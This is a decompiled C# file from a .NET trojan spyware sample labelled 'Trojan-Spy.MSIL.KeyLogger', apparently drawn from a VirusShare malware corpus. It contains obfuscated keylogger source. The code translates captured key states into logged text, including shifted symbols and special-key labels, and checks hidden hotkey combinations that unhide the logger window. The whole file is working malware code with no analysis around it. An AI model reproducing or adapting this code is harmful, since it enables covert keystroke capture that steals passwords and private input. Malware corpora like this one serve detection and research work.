// Decompiled with JetBrains decompiler
// Type: ᡾
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using KeyLogger.Properties;

internal static class \u187E
{
  private static string ᡆᙃ(char ᙂ, ᡘ ᙄ)
  {
    try
    {
      if (!Settings.Default.SpecialKeysDisabled)
      {
        switch (Settings.Default.SpecialKeys)
        {
          case 1:
            if ((ណ.រ(ᡈ.VK_TAB) == (short) -32767 || ណ.រ(ᡈ.VK_TAB) == short.MinValue) && (ណ.រ(ᡈ.VK_HOME) == (short) -32767 || ណ.រ(ᡈ.VK_HOME) == short.MinValue) && (ណ.រ(ᡈ.VK_END) == (short) -32767 || ណ.រ(ᡈ.VK_END) == short.MinValue))
            {
              \u17C6.Instance.showLogger();
              return ᙵ.\u1816ᙃ;
            }
            break;
          case 2:
            if ((ណ.រ(ᡈ.VK_LSHIFT) == (short) -32767 || ណ.រ(ᡈ.VK_LSHIFT) == short.MinValue) && (ណ.រ(ᡈ.VK_RSHIFT) == (short) -32767 || ណ.រ(ᡈ.VK_RSHIFT) == short.MinValue) && (ណ.រ(ᡈ.VK_F12) == (short) -32767 || ណ.រ(ᡈ.VK_F12) == short.MinValue))
            {
              \u17C6.Instance.showLogger();
              return ᙵ.\u1800ᙃ;
            }
            break;
          case 3:
            if ((ណ.រ(ᡈ.VK_LSHIFT) == (short) -32767 || ណ.រ(ᡈ.VK_LSHIFT) == short.MinValue) && (ណ.រ(ᡈ.VK_LCONTROL) == (short) -32767 || ណ.រ(ᡈ.VK_LCONTROL) == short.MinValue) && (ណ.រ(ᡈ.VK_F1) == (short) -32767 || ណ.រ(ᡈ.VK_F1) == short.MinValue))
            {
              \u17C6.Instance.showLogger();
              return ᙵ.\u181Aᙃ;
            }
            break;
        }
      }
      if (ណ.ក(ᡈ.VK_CAPITAL) == (short) 1)
        return string.Concat((object) char.ToUpper(ᙂ));
      if (ណ.រ(ᡈ.VK_LSHIFT) != (short) -32767 && ណ.រ(ᡈ.VK_RSHIFT) != (short) -32767 && ណ.រ(ᡈ.VK_LSHIFT) != short.MinValue)
      {
        if (ណ.រ(ᡈ.VK_RSHIFT) != short.MinValue)
          goto label_39;
      }
      if (char.IsLetter(ᙂ))
        return string.Concat((object) char.ToUpper(ᙂ));
      if (char.IsNumber(ᙂ))
      {
        switch (ᙂ)
        {
          case '0':
            return ")";
          case '1':
            return "!";
          case '2':
            return "@";
          case '3':
            return "#";
          case '4':
            return "$";
          case '5':
            return "%";
          case '6':
            return "^";
          case '7':
            return "&";
          case '8':
            return "*";
          case '9':
            return "(";
        }
      }
      else
      {
        switch (ᙂ)
        {
          case '\'':
            return ᙵ.\u1819ᙃ;
          case ',':
            return "<";
          case '-':
            return "_";
          case '.':
            return ">";
          case '/':
            return ᙵ.\u181Eᙃ;
          case ';':
            return ":";
          case '=':
            return "+";
          case '[':
            return "{";
          case '\\':
            return "|";
          case ']':
            return "}";
          case '`':
            return "~";
        }
      }
    }
    catch
    {
    }
label_39:
    return string.Concat((object) ᙂ);
  }

  public static string ᡒ(ᡘ vk)
  {
    do
      ;
    while (false);
    string str = "";
    switch (vk)
    {
      case ᡘ.VK_BACK:
        str = "[backspace]";
        break;
      case ᡘ.VK_TAB:
        str = \u187E.ᡆᙃ(' ', vk);
        if (str.Equals(" "))
        {
          str = "[tab]";
          break;
        }
        break;
      case ᡘ.VK_RETURN:
        str = "[return]";
        break;
      case ᡘ.VK_CAPITAL:
        str = "[caps lock]";
        break;
      case ᡘ.VK_SPACE:
        str = " ";
        break;
      case ᡘ.VK_END:
        str = \u187E.ᡆᙃ(' ', vk);
        if (str.Equals(" "))
        {
          str = "[end]";
          break;
        }
        break;
      case ᡘ.VK_HOME:
        str = \u187E.ᡆᙃ(' ', vk);
        if (str.Equals(" "))
        {
          str = "[home]";
          break;
        }
        break;
      case ᡘ.VK_DELETE:
        str = "[delete]";
        break;
      case ᡘ.VK_0:
        str = \u187E.ᡆᙃ('0', vk);
        break;
      case ᡘ.VK_1:
        str = \u187E.ᡆᙃ('1', vk);
        break;
      case ᡘ.VK_2:
        str = \u187E.ᡆᙃ('2', vk);
        break;
      case ᡘ.VK_3:
        str = \u187E.ᡆᙃ('3', vk);
        break;
      case ᡘ.VK_4:
        str = \u187E.ᡆᙃ('4', vk);
        break;
      case ᡘ.VK_5:
        str = \u187E.ᡆᙃ('5', vk);
        break;
      case ᡘ.VK_6:
        str = \u187E.ᡆᙃ('6', vk);
        break;
      case ᡘ.VK_7:
        str = \u187E.ᡆᙃ('7', vk);
        break;
      case ᡘ.VK_8:
        str = \u187E.ᡆᙃ('8', vk);
        break;
      case ᡘ.VK_9:
        str = \u187E.ᡆᙃ('9', vk);
        break;
      case ᡘ.VK_A:
        str = \u187E.ᡆᙃ('a', vk);
        break;
      case ᡘ.VK_B:
        str = \u187E.ᡆᙃ('b', vk);
        break;
      case ᡘ.VK_C:
        str = \u187E.ᡆᙃ('c', vk);
        break;
      case ᡘ.VK_D:
        str = \u187E.ᡆᙃ('d', vk);
        break;
      case ᡘ.VK_E:
        str = \u187E.ᡆᙃ('e', vk);
        break;
      case ᡘ.VK_F:
        str = \u187E.ᡆᙃ('f', vk);
        break;
      case ᡘ.VK_G:
        str = \u187E.ᡆᙃ('g', vk);
        break;
      case ᡘ.VK_H:
        str = \u187E.ᡆᙃ('h', vk);
        break;
      case ᡘ.VK_I:
        str = \u187E.ᡆᙃ('i', vk);
        break;
      case ᡘ.VK_J:
        str = \u187E.ᡆᙃ('j', vk);
        break;
      case ᡘ.VK_K:
        str = \u187E.ᡆᙃ('k', vk);
        break;
      case ᡘ.VK_L:
        str = \u187E.ᡆᙃ('l', vk);
        break;
      case ᡘ.VK_M:
        str = \u187E.ᡆᙃ('m', vk);
        break;
      case ᡘ.VK_N:
        str = \u187E.ᡆᙃ('n', vk);
        break;
      case ᡘ.VK_O:
        str = \u187E.ᡆᙃ('o', vk);
        break;
      case ᡘ.VK_P:
        str = \u187E.ᡆᙃ('p', vk);
        break;
      case ᡘ.VK_Q:
        str = \u187E.ᡆᙃ('q', vk);
        break;
      case ᡘ.VK_R:
        str = \u187E.ᡆᙃ('r', vk);
        break;
      case ᡘ.VK_S:
        str = \u187E.ᡆᙃ('s', vk);
        break;
      case ᡘ.VK_T:
        str = \u187E.ᡆᙃ('t', vk);
        break;
      case ᡘ.VK_U:
        str = \u187E.ᡆᙃ('u', vk);
        break;
      case ᡘ.VK_V:
        str = \u187E.ᡆᙃ('v', vk);
        break;
      case ᡘ.VK_W:
        str = \u187E.ᡆᙃ('w', vk);
        break;
      case ᡘ.VK_X:
        str = \u187E.ᡆᙃ('x', vk);
        break;
      case ᡘ.VK_Y:
        str = \u187E.ᡆᙃ('y', vk);
        break;
      case ᡘ.VK_Z:
        str = \u187E.ᡆᙃ('z', vk);
        break;
      case ᡘ.VK_NUMPAD0:
        str = "0";
        break;
      case ᡘ.VK_NUMPAD1:
        str = "1";
        break;
      case ᡘ.VK_NUMPAD2:
        str = "2";
        break;
      case ᡘ.VK_NUMPAD3:
        str = "3";
        break;
      case ᡘ.VK_NUMPAD4:
        str = "4";
        break;
      case ᡘ.VK_NUMPAD5:
        str = "5";
        break;
      case ᡘ.VK_NUMPAD6:
        str = "6";
        break;
      case ᡘ.VK_NUMPAD7:
        str = "7";
        break;
      case ᡘ.VK_NUMPAD8:
        str = "8";
        break;
      case ᡘ.VK_NUMPAD9:
        str = "9";
        break;
      case ᡘ.VK_MULTIPLICATION:
        str = "*";
        break;
      case ᡘ.VK_ADDITION:
        str = "+";
        break;
      case ᡘ.VK_SEPERATOR:
        str = "|";
        break;
      case ᡘ.VK_SUBTRACT:
        str = "-";
        break;
      case ᡘ.VK_DECIMAL:
        str = ".";
        break;
      case ᡘ.VK_DIVIDE:
        str = "/";
        break;
      case ᡘ.VK_F1:
        str = \u187E.ᡆᙃ(' ', vk);
        if (str.Equals(" "))
        {
          str = "[F1]";
          break;
        }
        break;
      case ᡘ.VK_F2:
        str = "[F2]";
        break;
      case ᡘ.VK_F3:
        str = "[F3]";
        break;
      case ᡘ.VK_F4:
        str = "[F4]";
        break;
      case ᡘ.VK_F5:
        str = "[F5]";
        break;
      case ᡘ.VK_F6:
        str = "[F6]";
        break;
      case ᡘ.VK_F7:
        str = "[F7]";
        break;
      case ᡘ.VK_F8:
        str = "[F8]";
        break;
      case ᡘ.VK_F9:
        str = "[F9]";
        break;
      case ᡘ.VK_F10:
        str = "[F10]";
        break;
      case ᡘ.VK_F11:
        str = "[F11]";
        break;
      case ᡘ.VK_F12:
        str = \u187E.ᡆᙃ(' ', vk);
        if (str.Equals(" "))
        {
          str = "[F12]";
          break;
        }
        break;
      case ᡘ.VK_NUMLOCK:
        str = "[numlock]";
        break;
      case ᡘ.VK_LSHIFT:
        str = \u187E.ᡆᙃ(' ', vk);
        if (str.Equals(" "))
        {
          str = "";
          break;
        }
        break;
      case ᡘ.VK_RSHIFT:
        str = \u187E.ᡆᙃ(' ', vk);
        if (str.Equals(" "))
        {
          str = "";
          break;
        }
        break;
      case ᡘ.VK_LCONTROL:
        str = \u187E.ᡆᙃ(' ', vk);
        if (str.Equals(" "))
        {
          str = "[lctrl]";
          break;
        }
        break;
      case ᡘ.VK_RCONTROL:
        str = "[rctrl]";
        break;
      case ᡘ.VK_OEM_1:
        str = \u187E.ᡆᙃ(';', vk);
        break;
      case ᡘ.VK_OEM_PLUS:
        str = \u187E.ᡆᙃ('=', vk);
        break;
      case ᡘ.VK_OEM_COMMA:
        str = \u187E.ᡆᙃ(',', vk);
        break;
      case ᡘ.VK_OEM_MINUS:
        str = \u187E.ᡆᙃ('-', vk);
        break;
      case ᡘ.VK_OEM_PERIOD:
        str = \u187E.ᡆᙃ('.', vk);
        break;
      case ᡘ.VK_OEM_2:
        str = \u187E.ᡆᙃ('/', vk);
        break;
      case ᡘ.VK_OEM_3:
        str = \u187E.ᡆᙃ('`', vk);
        break;
      case ᡘ.VK_OEM_4:
        str = \u187E.ᡆᙃ('[', vk);
        break;
      case ᡘ.VK_OEM_5:
        str = \u187E.ᡆᙃ('\\', vk);
        break;
      case ᡘ.VK_OEM_6:
        str = \u187E.ᡆᙃ(']', vk);
        break;
      case ᡘ.VK_OEM_7:
        str = \u187E.ᡆᙃ('\'', vk);
        break;
    }
    return str;
  }
}
